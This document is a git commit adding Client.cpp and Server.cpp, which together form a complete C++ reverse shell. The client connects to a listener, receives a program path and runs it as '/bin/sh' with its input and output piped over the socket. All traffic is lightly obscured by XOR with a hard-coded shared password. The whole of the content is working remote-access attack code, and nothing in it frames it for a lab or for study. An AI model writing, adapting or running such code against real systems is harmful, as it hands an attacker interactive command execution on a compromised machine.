14d411895283e3792725f690befb5514550adaf4
d3adly m1nd <d3adlym1nd64@gmail.com>
2020-06-02 20:02:13 -0400

    Added base files

---
+++ Client.cpp
@@ -0,0 +1,192 @@
+#include<iostream>
+#include<thread>
+#include<string>
+#include<cstring> 		
+#include<csignal>
+#include<unistd.h>			//sleep 
+#include<fcntl.h>
+#include<sys/socket.h>
+#include<arpa/inet.h>
+#include<netinet/in.h>
+#include<netdb.h>
+
+class Client{
+	private:
+		std::string strPassword = "$up3rP@sSw0rD";
+	public:
+		int sckSocket;
+		bool isRunningShell = false;
+		bool Connect(const char*, const char*);
+		void CloseConnection();
+		std::string Xor(const std::string);
+		void SpawnShell(const char*);
+		void threadReadShell(int);
+};
+
+void Client::threadReadShell(int iPipe){
+	char cCmdOutput[256];
+	int iRet = 0, iLen = 0;
+	while(isRunningShell){
+		iRet = read(iPipe, &cCmdOutput, 255);
+		if(iRet > 0){
+			cCmdOutput[iRet] = '\0';
+			std::string strOut = Xor(std::string(cCmdOutput));
+			iLen = strOut.length();
+			iRet = send(sckSocket, strOut.c_str(), iLen, 0);
+			if(iRet <= 0){
+				//socket error
+				isRunningShell = false;
+				break;
+			}
+		} else if(iRet == -1){
+			isRunningShell = false;
+			break;
+		}
+	}
+}
+
+void Client::SpawnShell(const char* cCmdLine){
+	int InPipe[2], OutPipe[2];
+	std::string strMessage = "";
+	int iLen = 0;
+	if(pipe(InPipe) == -1){
+		//error creating pipes
+		strMessage = Xor(std::string("xx0"));
+		iLen = strMessage.length();
+		send(sckSocket, strMessage.c_str(), iLen, 0);
+		return;
+	}
+	if(pipe(OutPipe) == -1){
+		//error creating pipes
+		strMessage = Xor(std::string("xx0"));
+		iLen = strMessage.length();
+		send(sckSocket, strMessage.c_str(), iLen, 0);
+		return;
+	}
+	pid_t pID = fork();
+	if(pID == 0){
+		strMessage = Xor(std::string("xx1"));
+		iLen = strMessage.length();
+		if(send(sckSocket, strMessage.c_str(), iLen ,0) <= 0){
+			//unable to send confirmation to server
+			exit(0);
+		}
+		
+		dup2(InPipe[0], 0);  //stdin
+		dup2(OutPipe[1], 1); //stdout
+		dup2(OutPipe[1], 2); //stderr
+		
+		close(InPipe[0]);
+		close(InPipe[1]);
+		close(OutPipe[0]);
+		close(OutPipe[1]);
+		
+		char *arg[] = {nullptr};
+		char *env[] = {nullptr};
+		char CMD[128];
+		strncpy(CMD, &cCmdLine[2], 128);
+		execve(CMD, arg, env);
+		exit(0);
+	} else if(pID > 0){
+		close(InPipe[0]);
+		close(OutPipe[1]);
+		isRunningShell = true;
+		std::thread th1(&Client::threadReadShell, this, OutPipe[0]);
+		std::string strCmd = "";
+		char cCmdBuffer[1025];
+		int iBytes = 0;
+		while(isRunningShell){
+			iBytes = recv(sckSocket, cCmdBuffer, 1024, 0);
+			if(iBytes > 0){
+				cCmdBuffer[iBytes] = '\0';
+				strCmd = Xor(std::string(cCmdBuffer));
+				iLen = strCmd.length();
+				if(write(InPipe[1], strCmd.c_str(), iLen) == -1){
+					isRunningShell = false;
+					break;
+				}
+			} else if(iBytes == -1){
+				//socket error;
+				isRunningShell = false;
+				break;
+			}
+		}
+		th1.join();
+	} else {
+		//fork failed
+		strMessage = Xor(std::string("xx0"));
+		iLen = strMessage.length();
+		send(sckSocket, strMessage.c_str(), iLen, 0);
+		close(InPipe[0]);
+		close(InPipe[1]);
+		close(OutPipe[0]);
+		close(OutPipe[1]);
+		return;
+	}
+}
+
+std::string Client::Xor(const std::string strMessage){
+	std::string strFinal = "";
+	for(char mC : strMessage){
+		for(char xC : strPassword){
+			mC ^= xC;
+		}
+		strFinal.append(1, mC);
+	}
+	return strFinal;
+}
+
+void Client::CloseConnection(){
+	close(sckSocket);
+}
+
+bool Client::Connect(const char* cHost, const char* cPort){
+	struct addrinfo strctAd, *strctP, *strctServer;
+	memset(&strctAd, 0, sizeof(strctAd));
+	strctAd.ai_family = AF_UNSPEC;
+	strctAd.ai_socktype = SOCK_STREAM;
+	int iRet = getaddrinfo(cHost, cPort, &strctAd, &strctServer);
+	if(iRet != 0){
+		//getaddrinfo error
+		return false;
+	}
+	for(strctP = strctServer; strctP != nullptr; strctP = strctP->ai_next){
+		if((sckSocket = socket(strctP->ai_family, strctP->ai_socktype, strctP->ai_protocol)) == -1){
+			//socket error
+			continue;
+		}
+		if(connect(sckSocket, strctP->ai_addr, strctP->ai_addrlen) == -1){
+			//connect error
+			continue;
+		}
+		//success
+		break;
+	}
+	if(strctP == nullptr){
+		//unable to connect
+		freeaddrinfo(strctServer);
+		return false;
+	}
+	freeaddrinfo(strctServer);
+	return true;
+}
+
+int main(){
+	signal(SIGPIPE, SIG_IGN);
+	Client *Cli = new Client;
+	if(Cli->Connect("127.0.0.1", "1337")){
+		char cCmdLine[128];
+		int iBytes = recv(Cli->sckSocket, cCmdLine, 128, 0);
+		if(iBytes > 0){
+			cCmdLine[iBytes] = '\0';
+			std::string strCmd = Cli->Xor(std::string(cCmdLine));
+			Cli->SpawnShell(strCmd.c_str());
+			Cli->CloseConnection();
+		} else {
+			//error receiving command
+		}
+	}
+	delete Cli;
+	Cli = nullptr;
+	return 0;
+}
---
+++ Server.cpp
@@ -0,0 +1,171 @@
+#include<iostream>
+#include<thread>
+#include<string>
+#include<cstring> 		
+#include<csignal>
+#include<unistd.h>			//sleep 
+#include<fcntl.h>
+#include<sys/socket.h>
+#include<arpa/inet.h>
+#include<netinet/in.h>
+#include<netdb.h>
+
+//beej guide network programming
+void *get_int_addr(struct sockaddr *sa){
+	if(sa->sa_family == AF_INET){
+		return &(((struct sockaddr_in*)sa)->sin_addr);
+	}
+	return &(((struct sockaddr_in6*)sa)->sin6_addr);
+}
+
+class Server{
+	private:
+		int sckMainSocket, iLocalPort;
+		std::string strPassword = "";
+	public:
+		Server() : iLocalPort(1337), strPassword("password") {}
+		Server(int iPort) : iLocalPort(iPort), strPassword("password") {}
+		Server(std::string strPass) : iLocalPort(1337), strPassword(strPass) {}
+		Server(int iPort, std::string strPass) : iLocalPort(iPort), strPassword(strPass) {}
+
+		bool isShellRunning = false;
+		
+		int sckInit();
+		int WaitConnection();
+		void SpawnShell(const char*, int);
+		std::string Xor(const std::string);
+		
+		void threadReceiveRemoteOutput(int);
+};
+
+void Server::SpawnShell(const char* cCmdLine, int iClientSck){
+	std::string strCommandLine = "xx";
+	strCommandLine.append(cCmdLine);
+	std::string strOut = Xor(strCommandLine);
+	int iLen = strOut.length();
+	if(send(iClientSck, strOut.c_str(), iLen, 0) <= 0){
+		std::cout<<"Unable to send command to client\n";
+		return;
+	}
+	//Wait client confirmation
+	char cCmdBuffer[5];
+	memset(cCmdBuffer, 0, 5);
+	if(recv(iClientSck, cCmdBuffer, 4, 0) <= 0){
+		std::cout<<"Unable to receive response from client\n";
+		return;
+	}
+	strCommandLine = Xor(std::string(cCmdBuffer));
+	if(strCommandLine[0] == 'x' && strCommandLine[1] == 'x' && strCommandLine[2] == '1'){
+		//Confirmed
+		isShellRunning = true;
+		std::thread th1(&Server::threadReceiveRemoteOutput, this, iClientSck);
+		char cCmdLine[1024];
+		std::string strInput = "";
+		while(isShellRunning){
+			memset(cCmdLine, 0, 1024);
+			fgets(cCmdLine, 1024, stdin);
+			strInput = Xor(std::string(cCmdLine));
+			iLen = strInput.length();
+			if(send(iClientSck, strInput.c_str(), iLen, 0) <= 0){
+				isShellRunning = false;
+				std::cout<<"Unable to send command to client\n";
+				break;
+			}
+		}
+		th1.join();
+	} else {
+		std::cout<<"Unable to spawn remote shell\n";
+		return;
+	}
+	
+}
+
+std::string Server::Xor(const std::string strMessage){
+	std::string strFinal = "";
+	for(char mC : strMessage){
+		for(char xC : strPassword){
+			mC ^= xC;
+		}
+		strFinal.append(1, mC);
+	}
+	return strFinal;
+}
+
+void Server::threadReceiveRemoteOutput(int iSocket){
+	char cCmdBuffer[1025];
+	int iBytes = 0;
+	while(isShellRunning){
+		iBytes = recv(iSocket, cCmdBuffer, 1024, 0);
+		if(iBytes > 0){
+			cCmdBuffer[iBytes] = '\0';
+			std::string strOutput = Xor(std::string(cCmdBuffer));
+			std::cout<<strOutput;
+		} else if(iBytes == -1){
+			std::cout<<"Socket error\n";
+			break;
+		}
+	}
+}
+
+int Server::WaitConnection(){
+	char strIP[INET6_ADDRSTRLEN];
+	int sckTmpSocket;
+	struct sockaddr_storage strctClient;
+	socklen_t slC = sizeof(strctClient);
+	sckTmpSocket = accept(sckMainSocket, (struct sockaddr *)&strctClient, &slC);
+	if(sckTmpSocket != -1){
+		inet_ntop(strctClient.ss_family, get_int_addr((struct sockaddr *)&strctClient),strIP, sizeof(strIP));
+		std::cout<<"New connection from "<<strIP<<'\n';
+	}
+	return sckTmpSocket;
+}
+
+int Server::sckInit(){
+	int iStat = 0, iYes = 1;
+	const char *cLocalPort = std::string(std::to_string(iLocalPort)).c_str();
+	struct addrinfo strctAd, *strctP, *strctServer;
+	memset(&strctAd, 0, sizeof(strctAd));
+	strctAd.ai_family = AF_UNSPEC;
+	strctAd.ai_socktype = SOCK_STREAM;
+	strctAd.ai_flags = AI_PASSIVE;
+	if((iStat = getaddrinfo(nullptr, cLocalPort, &strctAd, &strctServer)) != 0){
+		std::cout<<"Error getaddrinfo\n";
+		return false;
+	}
+	for(strctP = strctServer; strctP != nullptr; strctP = strctP->ai_next){
+		if((sckMainSocket = socket(strctP->ai_family, strctP->ai_socktype, strctP->ai_protocol)) == -1){
+			continue;
+		}
+		if(setsockopt(sckMainSocket, SOL_SOCKET, SO_REUSEADDR, &iYes, sizeof(int)) == -1){
+			std::cout<<"setsockopt error\n";
+			return false;
+		}
+		if(bind(sckMainSocket, strctP->ai_addr, strctP->ai_addrlen) == -1){
+			continue;
+		}
+		break;
+	}
+	freeaddrinfo(strctServer);
+	if(listen(sckMainSocket, 1) == -1){
+		std::cout<<"Error listening\n";
+		return false;
+	}
+	if(sckMainSocket == -1 || strctP == nullptr){
+		return false;
+	}
+	return true;
+}
+
+int main(){
+	Server *Srv = new Server(1337, "$up3rP@sSw0rD");
+	if(Srv->sckInit() != -1){
+		std::cout<<"Waiting for incomming connection\n";
+		int sckTmp = Srv->WaitConnection();
+		if(sckTmp != -1){
+			Srv->SpawnShell("/bin/sh", sckTmp);
+		}
+	}
+	delete Srv;
+	Srv = nullptr;
+	return 0;
+}
